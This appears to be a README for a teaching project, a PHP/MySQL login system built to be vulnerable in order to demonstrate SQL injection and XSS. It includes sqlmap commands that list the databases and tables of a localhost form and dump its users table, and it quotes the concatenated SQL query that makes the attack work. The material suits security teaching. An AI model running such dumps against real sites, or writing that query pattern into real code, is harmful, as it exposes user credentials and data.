<h1 align="center">Secure Login System</h1>

We created a login system, for the backend we use PHP and MySQL for the database and on the frontend we used HTML/CSS. 
The purpose of this project is to show how code becomes vulnerable to SQL injection.
We will analyze and perform SQL Injection attacks and Cross-Site Scripting attacks to see how they work when we do not secure the appropriate code. 
We'll use some attack tools like SQLMap. 

The project has three parts:

1.Secure Login System with Non-Sanitizing Code
Attacks like SQL Injection work here, as well as attacks like Cross-Site Scripting (XSS).
    This code is intentionally vulnerable to demonstrate:

    How legacy PHP applications become vulnerable
    Why string concatenation in SQL is dangerous
    How sqlmap and other tools exploit these weaknesses
    The importance of modern PHP security practices

2.Secure Login System with Partial Sanitizing Code
Attacks like SQL Injection don't work here, but there are some vulnerabilities related to Cross-Site Scripting (XSS).

3.Secure Login System with Complete Sanitizing Code
In this part, we have protected the code against both threats. Also, I will show you how to implement CAPTCHA for brute force protection.

![Sqlmap](https://raw.githubusercontent.com/cipriancyberspace/securewebapplication/99e7e8d24c04397303853220b9ae101d9e12e940/Secure_Login_System/images/sqlmap.png)



Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. 
It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, 
over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/ee5612aa8bd9970e35df345d5f98699db35a3003/Secure_Login_System/images/sqlmap_1.png)

<strong> 1.SQLMap Command Breakdown: </strong>
<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" --data="username=test&password=test" --dbs --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/1bf4ec6c5278162c33acfffa401df1ce9bfb6bfb/Secure_Login_System/images/sqlmap_3.png)

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/eff2084c859e84b41a33be3071eaf471de9b0d7e/Secure_Login_System/images/sqlmap_2.png)

<strong> 2.Explore your database: </strong>
<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db --tables --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/9086268e64a0716507f5dc933ce2bfb70513775b/Secure_Login_System/images/sqlmap_4.png)

<strong> 3.Dump user data: </strong>

<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db -T users --dump --batch</code> </pre>

<strong> 4.Get database schema: </strong>

<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db -T users --columns --batch</code> </pre>



⚠️ Why This Works 
Vulnerable PHP code:
<pre> <code>$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</code> </pre>
SQLMap exploits this by injecting payloads that break out of the SQL query, allowing it to execute additional SQL commands to enumerate databases.



